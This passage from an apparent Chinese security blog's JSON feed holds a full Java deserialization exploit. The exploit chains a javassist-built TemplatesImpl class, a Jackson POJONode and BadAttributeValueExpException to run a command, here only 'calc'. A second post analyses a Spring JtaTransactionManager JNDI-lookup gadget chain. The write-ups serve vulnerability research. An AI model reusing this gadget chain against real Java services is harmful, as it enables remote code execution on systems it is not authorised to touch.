&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"comment\">//使用javassist定义恶意代码</span></span><br><span class=\"line\">        <span class=\"type\">ClassPool</span> <span class=\"variable\">classPool</span> <span class=\"operator\">=</span> ClassPool.getDefault();</span><br><span class=\"line\">        classPool.insertClassPath(<span class=\"keyword\">new</span> <span class=\"title class_\">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class=\"line\">        <span class=\"type\">CtClass</span> <span class=\"variable\">cc</span> <span class=\"operator\">=</span> classPool.makeClass(<span class=\"string\">&quot;Evil&quot;</span>);</span><br><span class=\"line\">        String cmd= <span class=\"string\">&quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;</span>;</span><br><span class=\"line\">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class=\"line\">        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));</span><br><span class=\"line\">        <span class=\"type\">CtClass</span> <span class=\"variable\">ctClass</span> <span class=\"operator\">=</span> classPool.getCtClass(<span class=\"string\">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">CtMethod</span> <span class=\"variable\">writeReplace</span> <span class=\"operator\">=</span> ctClass.getDeclaredMethod(<span class=\"string\">&quot;writeReplace&quot;</span>);</span><br><span class=\"line\">        writeReplace.setName(<span class=\"string\">&quot;propeht&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        ctClass.toClass();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">byte</span>[] classBytes = cc.toBytecode();</span><br><span class=\"line\">        <span class=\"type\">byte</span>[][] code = <span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[][]&#123;classBytes&#125;;</span><br><span class=\"line\">        <span class=\"type\">TemplatesImpl</span> <span class=\"variable\">templates</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TemplatesImpl</span>();</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_bytecodes&quot;</span>, code);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_name&quot;</span>, <span class=\"string\">&quot;prophet&quot;</span>);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_class&quot;</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_tfactory&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">TransformerFactoryImpl</span>());</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">POJONode</span> <span class=\"variable\">node</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">POJONode</span>(templates);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">bad</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BadAttributeValueExpException</span>(<span class=\"literal\">null</span>);</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">field</span> <span class=\"operator\">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class=\"string\">&quot;val&quot;</span>);</span><br><span class=\"line\">        field.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        field.set(bad, node);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">out</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;ser.ser&quot;</span>));</span><br><span class=\"line\">        out.writeObject(bad);</span><br><span class=\"line\">        out.close();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">in</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"string\">&quot;ser.ser&quot;</span>));</span><br><span class=\"line\">        in.readObject();</span><br><span class=\"line\">        in.close();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setFieldValue</span><span class=\"params\">(<span class=\"keyword\">final</span> Object obj, <span class=\"keyword\">final</span> String fieldName, <span class=\"keyword\">final</span> Object value)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">Field</span> <span class=\"variable\">field</span> <span class=\"operator\">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class=\"line\">        field.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        field.set(obj, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img data-src=\"/2025/07/26/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250726125726865.png\" alt=\"image-20250726125726865\"></p>\n",
            "tags": [
                "web",
                "反序列化",
                "java"
            ]
        },
        {
            "id": "https://pr0phet1.github.io/2025/07/25/spring-jtaTranscationMannager%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/",
            "url": "https://pr0phet1.github.io/2025/07/25/spring-jtaTranscationMannager%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/",
            "title": "spring_jtaTranscationMannager漏洞分析",
            "date_published": "2025-07-25T01:41:36.000Z",
            "content_html": "<h1 id=\"管理依赖\"><a href=\"#管理依赖\" class=\"headerlink\" title=\"管理依赖\"></a>管理依赖</h1><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-tx<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>3.1.0.RELEASE<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>javax.transaction<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>jta<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.1<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>用于spring事务管理</p>\n<h1 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h1><h2 id=\"JtaTransactionManager\"><a href=\"#JtaTransactionManager\" class=\"headerlink\" title=\"JtaTransactionManager\"></a>JtaTransactionManager</h2><p><img data-src=\"/2025/07/25/spring-jtaTranscationMannager%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250721111840300.png\" alt=\"image-20250721111840300\"></p>\n<p>可以看到readObject方法中调用了initUserTransactionAndTransactionManager方法</p>\n<p><img data-src=\"/2025/07/25/spring-jtaTranscationMannager%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250721104430676.png\" alt=\"image-20250721104430676\"></p>\n<p>在initUserTransactionAndTransactionManager方法中又调用了lookupUserTransaction，值为我们设置的userTansactionName</p>\n<p><img data-src=\"/2025/07/25/spring-jtaTranscationMannager%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250721111048635.png\" alt=\"image-20250721111048635\"></p>\n<p>lookupUserTransaction调用了JndiTemplate对象的lookup方法</p>\n<h2 id=\"JndiTemplate\"><a href=\"#JndiTemplate\" class=\"headerlink\" title=\"JndiTemplate\"></a>JndiTemplate</h2><p><img data-src=\"/2025/07/25/spring-jtaTranscationMannager%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250721111145127.png\" alt=\"image-20250721111145127\"></p>\n<p>lookup方法嵌套调用真正的lookup，值还是之前的UserTransactionName</p>\n<p><img data-src=\"/2025/07/25/spring-jtaTranscationMannager%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250721111315387.png\" alt=\"image-20250721111315387\"></p>\n<p>可以看到在最后调用了execute方法</p>\n<p><img data-src=\"/2025/07/25/spring-jtaTranscationMannager%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250721111459644.png\" alt=\"image-20250721111459644\"></p>\n<p>可以看到execute方法内部其实就是</p>\n<p>getContext &#x3D;》 createInitialContext &#x3D;》 ctx &#x3D; InitialContext &#x3D;》InitialContext.lookup(UserTransactionName)</p>\n<p>然后这里的UserTransactionName我们也可以设置</p>\n<p><img data-src=\"/2025/07/25/spring-jtaTranscationMannager%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250721113855893.png\" alt=\"image-20250721113855893\"></p>\n<p><img data-src=\"/2025/07/25/spring-jtaTranscationMannager%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250721102137222.png\" alt=\"image-20250721102137222\"></p>\n",
            "tags": [
                "web",
                "反序列化",
                "java"
            ]
        }
    ]
}